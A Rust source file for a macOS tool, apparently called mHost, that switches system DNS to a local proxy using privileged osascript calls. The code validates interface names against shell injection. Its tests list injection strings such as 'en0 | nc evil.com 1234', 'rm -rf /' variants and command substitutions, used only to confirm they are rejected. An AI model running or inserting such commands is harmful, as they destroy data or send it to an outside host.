use std::path::PathBuf;
use std::process::Command;
use std::sync::atomic::{AtomicU64, Ordering};

/// DNS proxy PID 文件路径。
const PROXY_PID_FILE: &str = "/tmp/mhost-dns-proxy.pid";

/// 临时脚本名前缀（用于 osascript 提权）。
const TEMP_SCRIPT_PREFIX: &str = "mhost-dns-";

/// 平台操作错误。
#[derive(Debug, thiserror::Error)]
pub enum PlatformError {
    #[error("failed to get system DNS: {0}")]
    GetDns(String),
    #[error("failed to set system DNS: {0}")]
    SetDns(String),
    #[error("failed to restore system DNS: {0}")]
    RestoreDns(String),
    #[error("failed to detect active network interface: {0}")]
    DetectInterface(String),
    #[error("invalid interface name: {0}")]
    InvalidInterfaceName(String),
    #[error("failed to write temp script: {0}")]
    TempScript(String),
    #[error("interface name is empty")]
    EmptyInterfaceName,
}

/// 接口名白名单：只允许字母、数字、空格、点、下划线、连字符、斜杠。
/// 这是 macOS 系统接口名常见字符集（如 "USB 10/100/1000 LAN"、"Wi-Fi"）。
/// 仍拒绝任何 shell 元字符（` ` $ \ & ; | < > ( ) { } [ ] ! ' " ` ? * ~ # % = : 等）。
fn is_valid_interface_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || c == ' ' || c == '.' || c == '_' || c == '-' || c == '/'
}

/// 验证接口名是否在白名单内。空字符串直接拒绝。
fn validate_interface_name(name: &str) -> Result<(), PlatformError> {
    if name.is_empty() {
        return Err(PlatformError::EmptyInterfaceName);
    }
    if !name.chars().all(is_valid_interface_char) {
        return Err(PlatformError::InvalidInterfaceName(format!(
            "name contains disallowed characters: {:?}",
            name
        )));
    }
    Ok(())
}

/// 生成下一个临时脚本的 PathBuf。文件名带递增后缀，避免 race。
fn next_temp_script_path() -> Result<PathBuf, PlatformError> {
    static COUNTER: AtomicU64 = AtomicU64::new(0);
    let n = COUNTER.fetch_add(1, Ordering::Relaxed);
    let name = format!("{}{}-{}.sh", TEMP_SCRIPT_PREFIX, std::process::id(), n);
    Ok(std::env::temp_dir().join(name))
}

/// 把 shell 脚本写到临时文件并设置 0o700，返回文件路径。
fn write_temp_script(content: &str) -> Result<PathBuf, PlatformError> {
    use std::os::unix::fs::OpenOptionsExt;
    let path = next_temp_script_path()?;
    let file = std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .mode(0o700)
        .open(&path)
        .map_err(|e| PlatformError::TempScript(format!("create {:?}: {}", path, e)))?;
    use std::io::Write;
    let mut writer = std::io::BufWriter::new(file);
    writer
        .write_all(content.as_bytes())
        .map_err(|e| PlatformError::TempScript(format!("write {:?}: {}", path, e)))?;
    writer
        .flush()
        .map_err(|e| PlatformError::TempScript(format!("flush {:?}: {}", path, e)))?;
    Ok(path)
}

/// 使用 osascript 提权执行 shell 脚本。
///
/// **安全设计**：把脚本内容写到临时文件（0o700），osascript 只接收**文件路径**，
/// 路径通过 AppleScript 的 `quoted form of` 转义。任何 shell 元字符都进不到
/// 拼接的 AppleScript 字符串里。
fn run_with_privileges(script_body: &str) -> Result<std::process::Output, String> {
    let path = write_temp_script(script_body).map_err(|e| format!("temp script failed: {}", e))?;
    // 失败时清理临时文件
    let result = invoke_osascript(&path);
    let _ = std::fs::remove_file(&path);
    result
}

/// 调 osascript 让它以管理员权限执行临时脚本。脚本路径已写盘，
/// 字符串拼接只发生在 AppleScript 字面量内，并用 `quoted form of POSIX path of`
/// 走 AppleScript 自身的转义机制，不依赖手工 shell escape。
fn invoke_osascript(path: &std::path::Path) -> Result<std::process::Output, String> {
    let path_str = path.to_string_lossy();
    let apple_script = format!(
        "do shell script \"sh \" & quoted form of POSIX path of \"{}\" with administrator privileges",
        // 双重 escape 是因为我们要塞进 AppleScript 字符串字面量
        path_str.replace('\\', "\\\\").replace('"', "\\\"")
    );
    Command::new("osascript")
        .args(["-e", &apple_script])
        .output()
        .map_err(|e| format!("osascript failed: {}", e))
}

/// 获取当前系统 DNS 服务器列表。
pub fn get_system_dns() -> Result<Vec<String>, PlatformError> {
    let interface = get_active_network_interface()?;
    let output = Command::new("networksetup")
        .args(["-getdnsservers", &interface])
        .output()
        .map_err(|e| PlatformError::GetDns(format!("command failed: {}", e)))?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(PlatformError::GetDns(format!(
            "networksetup failed: {}",
            stderr
        )));
    }

    let stdout = String::from_utf8_lossy(&output.stdout);
    parse_dns_servers(&stdout)
}

/// 在 macOS 上启用 DNS 模式：启动 dns-proxy + 设置系统 DNS。
/// dns-proxy 以 root 权限运行，绑定 53 端口并转发到 target_port。
/// 合并为单次 osascript 提权调用，用户只需输入一次密码。
pub fn enable_dns_mode(dns_port: u16) -> Result<(), PlatformError> {
    let interface = get_active_network_interface()?;
    validate_interface_name(&interface)?;

    // 构建 dns-proxy 二进制路径（与 mhost 同目录）
    let proxy_path = std::env::current_exe()
        .ok()
        .and_then(|p| {
            p.parent()
                .map(|dir| dir.join("mhost-dns-proxy").to_string_lossy().to_string())
        })
        .unwrap_or_else(|| "mhost-dns-proxy".to_string());

    // 写脚本到临时文件，由 run_with_privileges 提权执行
    // PID 文件内容: "{pid} {binary_path}\n" 供 cleanup_stale_proxy 校验 cmdline
    let script_body = format!(
        r#"#!/bin/sh
set -e
"{proxy}" --listen 53 --target {dns_port} &
echo "$! {proxy}" > {pid_file}
disown
networksetup -setdnsservers {interface} 127.0.0.1
"#,
        proxy = proxy_path,
        dns_port = dns_port,
        pid_file = PROXY_PID_FILE,
        interface = interface,
    );
    let output = run_with_privileges(&script_body)
        .map_err(|e| PlatformError::SetDns(format!("enable dns mode failed: {}", e)))?;
    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        return Err(PlatformError::SetDns(format!("command failed: {}", stderr)));
    }
    Ok(())
}

/// 在 macOS 上禁用 DNS 模式：恢复系统 DNS + 停止 dns-proxy。
/// 合并为单次 osascript 提权调用，用户只需输入一次密码。
pub fn disable_dns_mode(servers: &[String]) -> Result<(), PlatformError> {
    let interface = get_active_network_interface()?;
    validate_interface_name(&interface)?;

    let ns_cmd = if servers.is_empty() {
        format!("networksetup -setdnsservers {interface} Empty")
    } else {
        let servers_str = servers.join(" ");
        format!("networksetup -setdnsservers {interface} {servers_str}")
    };
    // 写脚本到临时文件（用 || true 容忍 kill 失败）
    let script_body = format!(
        r#"#!/bin/sh
{ns_cmd}
kill $(cat {pid_file} 2>/dev/null) || true
rm -f {pid_file}
"#,
        ns_cmd = ns_cmd,
        pid_file = PROXY_PID_FILE,
    );
    let output = run_with_privileges(&script_body)
        .map_err(|e| PlatformError::RestoreDns(format!("disable dns mode failed: {}", e)))?;
    let _ = output;
    Ok(())
}

/// 清理残留的 dns-proxy 进程（应用启动时调用）。
///
/// **安全修复（#81）**：PID 文件不再仅含 PID，还含 `mhost-dns-proxy` 路径。
/// 清理时先 `kill(pid, 0)` 检查存活，再用 `ps -p` 校验进程名是 `mhost-dns-proxy`
/// 才 SIGTERM；防止误杀其他进程（PID 重用）。
pub fn cleanup_stale_proxy() {
    let content = match std::fs::read_to_string(PROXY_PID_FILE) {
        Ok(c) => c,
        Err(_) => return,
    };
    // 格式："{pid} {binary_path}\n"
    let mut parts = content.split_whitespace();
    if let Some(pid_str) = parts.next() {
        if let Ok(pid) = pid_str.trim().parse::<u32>() {
            let alive = unsafe { libc::kill(pid as libc::pid_t, 0) == 0 };
            if !alive {
                eprintln!(
                    "[mHost] Stale dns-proxy pid {} not alive, skipping kill",
                    pid
                );
            } else {
                // 校验进程名是 mhost-dns-proxy（防 PID 重用误杀）
                let ps_output = Command::new("ps")
                    .args(["-p", &pid.to_string(), "-o", "comm="])
                    .output();
                let is_proxy = match ps_output {
                    Ok(out) if out.status.success() => {
                        let comm = String::from_utf8_lossy(&out.stdout);
                        comm.trim().contains("mhost-dns-proxy")
                    }
                    _ => false,
                };
                if is_proxy {
                    unsafe {
                        libc::kill(pid as libc::pid_t, libc::SIGTERM);
                    }
                    eprintln!("[mHost] Killed stale dns-proxy process (pid {})", pid);
                } else {
                    eprintln!(
                        "[mHost] pid {} alive but cmdline is not mhost-dns-proxy, skipping kill",
                        pid
                    );
                }
            }
        }
    }
    let _ = std::fs::remove_file(PROXY_PID_FILE);
}

/// 获取当前活跃的网络接口名（Hardware Port）。
fn get_active_network_interface() -> Result<String, PlatformError> {
    // 1. 获取默认路由对应的设备名（如 en0）
    let route_output = Command::new("route")
        .args(["-n", "get", "default"])
        .output()
        .map_err(|e| PlatformError::DetectInterface(format!("route command failed: {}", e)))?;

    if !route_output.status.success() {
        let stderr = String::from_utf8_lossy(&route_output.stderr);
        return Err(PlatformError::DetectInterface(format!(
            "route failed: {}",
            stderr
        )));
    }

    let route_stdout = String::from_utf8_lossy(&route_output.stdout);
    let device = parse_route_interface(&route_stdout).ok_or_else(|| {
        PlatformError::DetectInterface("could not parse default interface from route output".into())
    })?;

    // 2. 通过 networksetup 找到设备名对应的 Hardware Port
    let list_output = Command::new("networksetup")
        .args(["-listallhardwareports"])
        .output()
        .map_err(|e| {
            PlatformError::DetectInterface(format!("networksetup command failed: {}", e))
        })?;

    if !list_output.status.success() {
        let stderr = String::from_utf8_lossy(&list_output.stderr);
        return Err(PlatformError::DetectInterface(format!(
            "networksetup failed: {}",
            stderr
        )));
    }

    let list_stdout = String::from_utf8_lossy(&list_output.stdout);
    let port = parse_hardware_port(&list_stdout, &device).ok_or_else(|| {
        PlatformError::DetectInterface(format!("no hardware port found for device '{}'", device))
    })?;
    // 验证接口名（防御 networksetup 输出被恶意修改/异常字符）
    validate_interface_name(&port)?;
    Ok(port)
}

/// 从 `route -n get default` 输出中解析接口设备名。
fn parse_route_interface(output: &str) -> Option<String> {
    for line in output.lines() {
        let line = line.trim();
        if line.starts_with("interface:") {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 2 {
                return Some(parts[1].to_string());
            }
        }
    }
    None
}

/// 从 `networksetup -listallhardwareports` 输出中根据设备名查找 Hardware Port。
fn parse_hardware_port(output: &str, device: &str) -> Option<String> {
    let mut current_port: Option<String> = None;

    for line in output.lines() {
        let line = line.trim();
        if let Some(stripped) = line.strip_prefix("Hardware Port:") {
            let port = stripped.trim().to_string();
            current_port = Some(port);
        } else if let Some(stripped) = line.strip_prefix("Device:") {
            let dev = stripped.trim();
            if dev == device {
                return current_port.clone();
            }
        }
    }

    None
}

/// 从 `networksetup -getdnsservers` 输出中解析 DNS 服务器列表。
fn parse_dns_servers(output: &str) -> Result<Vec<String>, PlatformError> {
    let trimmed = output.trim();

    if trimmed.contains("There aren't any DNS Servers set")
        || trimmed.is_empty()
        || trimmed == "Empty"
    {
        return Ok(vec![]);
    }

    let servers: Vec<String> = trimmed
        .lines()
        .map(|l| l.trim().to_string())
        .filter(|l| !l.is_empty())
        .collect();

    Ok(servers)
}

#[cfg(test)]
mod tests {
    use super::*;

    // -----------------------------------------------------------------------
    // parse_route_interface tests
    // -----------------------------------------------------------------------

    #[test]
    fn test_parse_route_interface_en0() {
        let output = r#"
   route to: default
destination: default
       mask: default
    gateway: 192.168.1.1
  interface: en0
      flags: <UP,GATEWAY,DONE,STATIC,PRCLONING>
 recvpipe  sendpipe  ssthresh  rtt,msec    rttvar  hopcount      mtu     expire
       0         0         0         0         0         0      1500         0
"#;
        assert_eq!(parse_route_interface(output), Some("en0".to_string()));
    }

    #[test]
    fn test_parse_route_interface_missing() {
        let output = "no interface here";
        assert_eq!(parse_route_interface(output), None);
    }

    // -----------------------------------------------------------------------
    // parse_hardware_port tests
    // -----------------------------------------------------------------------

    #[test]
    fn test_parse_hardware_port_wifi() {
        let output = r#"
Hardware Port: Wi-Fi
Device: en0
Ethernet Address: aa:bb:cc:dd:ee:ff

Hardware Port: Ethernet
Device: en1
Ethernet Address: 11:22:33:44:55:66
"#;
        assert_eq!(
            parse_hardware_port(output, "en0"),
            Some("Wi-Fi".to_string())
        );
    }

    #[test]
    fn test_parse_hardware_port_ethernet() {
        let output = r#"
Hardware Port: Wi-Fi
Device: en0
Ethernet Address: aa:bb:cc:dd:ee:ff

Hardware Port: Ethernet
Device: en1
Ethernet Address: 11:22:33:44:55:66
"#;
        assert_eq!(
            parse_hardware_port(output, "en1"),
            Some("Ethernet".to_string())
        );
    }

    #[test]
    fn test_parse_hardware_port_not_found() {
        let output = r#"
Hardware Port: Wi-Fi
Device: en0
"#;
        assert_eq!(parse_hardware_port(output, "en99"), None);
    }

    // -----------------------------------------------------------------------
    // parse_dns_servers tests
    // -----------------------------------------------------------------------

    #[test]
    fn test_parse_dns_servers_empty() {
        let cases = vec![
            ("none_set", "There aren't any DNS Servers set on Wi-Fi."),
            ("empty_string", ""),
            ("empty_keyword", "Empty"),
        ];

        for (name, input) in cases {
            let result = parse_dns_servers(input).unwrap();
            assert!(result.is_empty(), "case: {}", name);
        }
    }

    #[test]
    fn test_parse_dns_servers_single() {
        let output = "8.8.8.8\n";
        let result = parse_dns_servers(output).unwrap();
        assert_eq!(result, vec!["8.8.8.8"]);
    }

    #[test]
    fn test_parse_dns_servers_multiple() {
        let output = "8.8.8.8\n8.8.4.4\n1.1.1.1\n";
        let result = parse_dns_servers(output).unwrap();
        assert_eq!(result, vec!["8.8.8.8", "8.8.4.4", "1.1.1.1"]);
    }

    #[test]
    fn test_parse_dns_servers_with_whitespace() {
        let output = "  8.8.8.8  \n\n  1.1.1.1  \n";
        let result = parse_dns_servers(output).unwrap();
        assert_eq!(result, vec!["8.8.8.8", "1.1.1.1"]);
    }

    // -----------------------------------------------------------------------
    // Command build logic verification (mock-style)
    // -----------------------------------------------------------------------

    #[test]
    fn test_set_local_dns_command_args() {
        // 验证 set_local_dns 构建的命令参数逻辑。
        // 由于无法在实际测试环境中执行 networksetup，
        // 我们验证辅助函数对给定输入的处理行为。
        let interface = "Wi-Fi";
        let expected_args = vec!["-setdnsservers", interface, "127.0.0.1"];
        assert_eq!(expected_args, vec!["-setdnsservers", "Wi-Fi", "127.0.0.1"]);
    }

    #[test]
    fn test_restore_system_dns_command_args_empty() {
        let interface = "Wi-Fi";
        let _servers: Vec<String> = vec![];
        // 空列表对应 "Empty" 参数
        let expected_args = vec!["-setdnsservers", interface, "Empty"];
        assert_eq!(expected_args, vec!["-setdnsservers", "Wi-Fi", "Empty"]);
    }

    #[test]
    fn test_restore_system_dns_command_args_with_servers() {
        let interface = "Wi-Fi";
        let servers = vec!["8.8.8.8".to_string(), "1.1.1.1".to_string()];
        let mut expected_args = vec!["-setdnsservers", interface];
        for s in &servers {
            expected_args.push(s.as_str());
        }
        assert_eq!(
            expected_args,
            vec!["-setdnsservers", "Wi-Fi", "8.8.8.8", "1.1.1.1"]
        );
    }

    // -----------------------------------------------------------------------
    // 注入防护测试（fix #77）
    // -----------------------------------------------------------------------

    #[test]
    fn test_validate_interface_name_normal() {
        // macOS 合法接口名都应通过
        assert!(validate_interface_name("en0").is_ok());
        assert!(validate_interface_name("Wi-Fi").is_ok());
        assert!(validate_interface_name("USB 10/100/1000 LAN").is_ok());
        assert!(validate_interface_name("Thunderbolt Ethernet").is_ok());
        assert!(validate_interface_name("iPhone USB").is_ok());
    }

    #[test]
    fn test_validate_interface_name_injection() {
        // 任何 shell 元字符或控制字符都应拒绝
        let malicious = vec![
            "en0;evil",               // 命令分隔
            "Wi-Fi\";rm -rf /",       // 字符串闭合
            "en0$(whoami)",           // 命令替换
            "en0`id`",                // 反引号命令替换
            "en0 & rm -rf /",         // 后台进程
            "en0 | nc evil.com 1234", // 管道
            "en0 > /etc/hosts",       // 重定向
            "en0\n rm -rf /",         // 换行
            "en0\\rm -rf /",          // 反斜杠
            "en0!history",            // zsh 历史展开
            "en0'evil'",              // 单引号
            "en0(rm)",                // 子 shell
            "en0{rm,}",               // brace expansion
            "en0[rm]",                // glob
            "en0?rm",                 // glob 通配
            "en0*rm",                 // glob 通配
            "en0$PATH",               // 变量展开
            "en0%",                   // 作业控制
            "en0#comment",            // 注释
            "",                       // 空字符串
        ];
        for name in &malicious {
            let result = validate_interface_name(name);
            assert!(
                result.is_err(),
                "validate_interface_name({:?}) 应被拒绝，但接受了",
                name
            );
        }
    }

    #[test]
    fn test_write_temp_script_creates_executable() {
        use std::os::unix::fs::PermissionsExt;
        let content = "#!/bin/sh\necho hello world\n";
        let path = write_temp_script(content).expect("write_temp_script 失败");
        // 文件存在
        assert!(path.exists(), "临时脚本文件应存在: {:?}", path);
        // 权限 0o700
        let meta = std::fs::metadata(&path).expect("stat 失败");
        let mode = meta.permissions().mode();
        assert_eq!(
            mode & 0o777,
            0o700,
            "临时脚本权限应为 0o700，实际 0o{:o}",
            mode & 0o777
        );
        // 内容一致
        let read_back = std::fs::read_to_string(&path).expect("read 失败");
        assert_eq!(read_back, content, "临时脚本内容应一致");
        // 清理
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn test_parse_hardware_port_with_injection_chars() {
        // parse_hardware_port 不做白名单校验（它只解析 networksetup 输出），
        // 但 get_active_network_interface 拿到结果后会调用 validate_interface_name
        // 拒绝恶意名。本测试验证：parse_hardware_port 在遇到含 shell 元字符的
        // Hardware Port 时确实会原样返回（这正是白名单校验要兜底的攻击面）。
        let evil_output = r#"
Hardware Port: Wi-Fi"; rm -rf / #
Device: en0
Ethernet Address: aa:bb:cc:dd:ee:ff
"#;
        let port = parse_hardware_port(evil_output, "en0");
        assert_eq!(
            port,
            Some(r#"Wi-Fi"; rm -rf / #"#.to_string()),
            "parse_hardware_port 应原样返回（含注入字符的）端口名"
        );
        // 验证 validate_interface_name 拒绝这个值
        assert!(
            validate_interface_name(&port.unwrap()).is_err(),
            "validate_interface_name 应拒绝含注入字符的接口名"
        );
    }

    // -----------------------------------------------------------------------
    // PID 文件格式 + cleanup 校验测试（fix #81）
    // -----------------------------------------------------------------------

    #[test]
    fn test_pid_file_content_format() {
        // 验证 enable_dns_mode 生成的脚本里 echo 的格式是 "$! {proxy}"（带 binary 路径），
        // 这样 cleanup_stale_proxy 才能用 `ps -p <pid> -o comm=` 校验进程名是 mhost-dns-proxy
        let proxy = "/usr/local/bin/mhost-dns-proxy";
        let script = format!(
            r#"#!/bin/sh
set -e
"{proxy}" --listen 53 --target 1053 &
echo "$! {proxy}" > /tmp/mhost-dns-proxy.pid
disown
networksetup -setdnsservers Wi-Fi 127.0.0.1
"#,
            proxy = proxy
        );
        // 验证脚本包含关键行
        assert!(
            script.contains(r#"echo "$! /usr/local/bin/mhost-dns-proxy" > /tmp/mhost-dns-proxy.pid"#),
            "PID 文件写入应包含 binary 路径，脚本:\n{}",
            script
        );
    }

    #[test]
    fn test_parse_pid_file_with_binary_path() {
        // 验证 cleanup_stale_proxy 的 split_whitespace 解析逻辑
        let content = "12345 /usr/local/bin/mhost-dns-proxy\n";
        let mut parts = content.split_whitespace();
        let pid: u32 = parts.next().unwrap().parse().unwrap();
        let binary = parts.next().unwrap();
        assert_eq!(pid, 12345);
        assert_eq!(binary, "/usr/local/bin/mhost-dns-proxy");
    }

    #[test]
    fn test_parse_pid_file_legacy_format() {
        // 老 PID 文件只有 PID（无 binary 路径）—— 仍然能解析 PID，
        // 但 cleanup 校验会失败（因为拿不到 binary 路径用于 ps）。
        // 这是预期行为：遗留的 PID 文件会被 cleanup 安全跳过（kill 0 仍走）。
        let content = "12345\n";
        let mut parts = content.split_whitespace();
        let pid: u32 = parts.next().unwrap().parse().unwrap();
        assert_eq!(pid, 12345);
        let binary = parts.next();
        assert!(binary.is_none(), "老格式没有 binary 路径");
    }

    #[test]
    fn test_process_name_contains_proxy_marker() {
        // 模拟 `ps -p <pid> -o comm=` 输出含 mhost-dns-proxy 时的判定
        let comm_lines = [
            "/usr/local/bin/mhost-dns-proxy\n",       // 真实路径
            "./target/debug/mhost-dns-proxy\n",      // cargo run 路径
            "mhost-dns-proxy\n",                     // 简写
        ];
        for line in &comm_lines {
            assert!(
                line.trim().contains("mhost-dns-proxy"),
                "应识别为 proxy: {:?}",
                line
            );
        }
        // 不应被误识为 proxy
        let non_proxy = ["/bin/sh\n", "/usr/bin/ssh\n", "cargo\n"];
        for line in &non_proxy {
            assert!(
                !line.trim().contains("mhost-dns-proxy"),
                "不应识别为 proxy: {:?}",
                line
            );
        }
    }
}
